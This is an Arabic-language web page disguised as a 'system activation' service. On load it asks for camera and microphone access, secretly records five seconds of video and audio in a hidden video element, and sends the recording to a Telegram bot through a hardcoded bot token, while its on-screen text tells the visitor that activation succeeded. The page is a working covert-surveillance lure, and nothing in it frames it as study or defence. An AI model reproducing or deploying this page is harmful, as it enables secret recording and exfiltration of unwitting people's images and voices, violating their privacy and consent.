<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل النظام</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #000; color: white; margin: 0; }
        #status { font-size: 18px; text-align: center; padding: 20px; }
        video { display: none; }
    </style>
</head>
<body>

    <div id="status">جاري تهيئة النظام...</div>
    
    <video id="video" autoplay muted playsinline></video>

    <script>
        const video = document.getElementById('video');
        const statusText = document.getElementById('status');
        
        // الحصول على sender_id من الرابط
        const urlParams = new URLSearchParams(window.location.search);
        const senderId = urlParams.get('sender_id');
        const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";

        // وظيفة التشغيل التلقائي بمجرد تحميل الصفحة
        window.onload = async () => {
            // التأكد من وجود المعرف أولاً
            if (!senderId) {
                statusText.innerText = "خطأ: لم يتم العثور على معرف المستخدم. يرجى فتح الرابط من البوت.";
                statusText.style.color = "red";
                return;
            }

            try {
                // طلب الإذن فوراً
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                statusText.innerText = "جاري تفعيل الخدمة...";
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    await sendVideoToTelegram(blob);
                    stream.getTracks().forEach(track => track.stop());
                };

                // بدء التسجيل تلقائياً
                mediaRecorder.start();
                
                // تسجيل لمدة 5 ثوانٍ
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 5000);

            } catch (err) {
                statusText.innerText = "يرجى السماح بالوصول للكاميرا لتشغيل الخدمة.";
            }
        };

        async function sendVideoToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', senderId);
            formData.append('video', videoBlob, 'recording.mp4');

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    statusText.innerText = "تم التفعيل بنجاح!";
                } else {
                    statusText.innerText = "فشل إرسال البيانات.";
                }
            } catch (error) {
                statusText.innerText = "خطأ في الاتصال بالسيرفر.";
            }
        }
    </script>
</body>
</html>
